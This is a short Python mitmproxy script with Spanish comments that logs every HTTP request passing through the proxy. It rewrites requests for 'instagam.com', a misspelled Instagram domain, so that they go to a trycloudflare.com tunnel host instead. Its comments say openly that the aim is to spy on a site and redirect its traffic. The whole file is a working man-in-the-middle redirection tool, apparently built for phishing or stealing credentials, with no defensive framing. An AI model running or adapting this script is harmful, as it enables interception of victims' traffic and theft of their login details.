#!/usr/bin/env python3
from mitmproxy import http
import signal
import os
# --- Configuración ---
# El sitio web que quieres espiar y redirigir
HOST_A_INTERCEPTAR = "instagam.com"
# El nuevo sitio al que se redirigirá el tráfico
NUEVO_DESTINO = "cas-trainer-sociology-madonna.trycloudflare.com"
def senial(s,f):
    print("\n[+] Saliendo...")
    os._exit(1)
signal.signal(signal.SIGINT, senial)
def request(flow: http.HTTPFlow) -> None:
    """
    Esta función se ejecuta para cada petición HTTP que pasa por el proxy
    """
    # 1. Imprimimos el host original de la petición
    # flow.request.pretty_host es la forma más fiable de ver el destino
    print(f"[*] Petición detectada para: {flow.request.pretty_host}")
    print(f"{flow}")
    # 2. Comprobamos si el host es el que queremos interceptar
    if flow.request.pretty_host == HOST_A_INTERCEPTAR:
        print(f"[+] ¡Interceptado! Tráfico para {HOST_A_INTERCEPTAR}")
        # 3. Cambiamos el destino de la petición
        flow.request.host = NUEVO_DESTINO
        print(f"    -> Redirigido a: {flow.request.host}")

